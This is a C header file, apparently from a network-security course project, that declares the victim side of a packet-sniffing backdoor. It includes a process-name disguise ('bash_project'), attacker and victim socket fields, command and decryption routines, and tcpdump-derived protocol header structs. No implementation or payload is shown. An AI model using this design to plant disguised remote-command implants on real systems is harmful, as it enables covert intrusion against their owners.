#ifndef COMP8505_PROJECT_VICTIM_H
#define COMP8505_PROJECT_VICTIM_H

#include "common.h"


#define DEFAULT_COUNT 100
#define SIZE_ETHERNET 14

#define DEFAULT_PORT 53000
#define TRUE 1
#define FALSE 0
#define MASK "bash_project"

void check_root_user(void);
char encrypt_decrypt(char input);


// tcpdump header (ether.h) defines ETHER_HDRLEN)
#ifndef ETHER_HDRLEN
#define ETHER_HDRLEN 14
#endif

struct options_victim {
    unsigned int count;
    int victim_socket;
    int attacker_socket;
    char temp_ip[16];
    char sniffer_ip[16];
    char decrypt_instruction[128];
    char filter[128];
    bool victim_flag;
    bool pcap2_flag;
    bool serv_flag;
    bool command_flag;
    bool ip_flag;
    char buffer[65507];
};


// Function Prototypes
void options_victim_init(struct options_victim *opts);
void program_setup(void);
void initialize_victim_server(struct options_victim *opts);
void add_new_socket(struct options_victim *opts, int attacker_socket, struct sockaddr_in *attacker_address);

u_int16_t handle_ethernet (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void handle_IP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void handle_TCP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void print_payload (const u_char *, int);
void print_hex_ascii_line (const u_char *, int, int);
void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void decrypt_payload(u_char *payload);
void extract_square_bracket_string(char* input);

void *track_opts_victim_flag(void *vargp);
void pkt_callback2(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);

/*
 * Structure of an internet header, stripped of all options.
 *
 * This is taken directly from the tcpdump source
 *
 * We declare ip_len and ip_off to be short, rather than u_short
 * pragmatically since otherwise unsigned comparisons can result
 * against negative integers quite easily, and fail in subtle ways.
 */
struct my_ip {
    u_int8_t	ip_vhl;		/* header length, version */
#define IP_V(ip)	(((ip)->ip_vhl & 0xf0) >> 4)
#define IP_HL(ip)	((ip)->ip_vhl & 0x0f)
    u_int8_t	ip_tos;		/* type of service */
    u_int16_t	ip_len;		/* total length */
    u_int16_t	ip_id;		/* identification */
    u_int16_t	ip_off;		/* fragment offset field */
#define	IP_DF 0x4000			/* dont fragment flag */
#define	IP_MF 0x2000			/* more fragments flag */
#define	IP_OFFMASK 0x1fff		/* mask for fragmenting bits */
    u_int8_t	ip_ttl;		/* time to live */
    u_int8_t	ip_p;		/* protocol */
    u_int16_t	ip_sum;		/* checksum */
    struct	in_addr ip_src, ip_dst;	/* source and dest address */
};

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
    u_short th_sport;               /* source port */
    u_short th_dport;               /* destination port */
    tcp_seq th_seq;                 /* sequence number */
    tcp_seq th_ack;                 /* acknowledgement number */
    u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
    u_char  th_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    u_short th_win;                 /* window */
    u_short th_sum;                 /* checksum */
    u_short th_urp;                 /* urgent pointer */
};


struct sniff_udp {
    u_int16_t uh_sport;                /* source port */
    u_int16_t uh_dport;                /* destination port */
    u_int16_t uh_ulen;                 /* udp length */
    u_int16_t uh_sum;                  /* udp checksum */
};


#endif //COMP8505_PROJECT_VICTIM_H
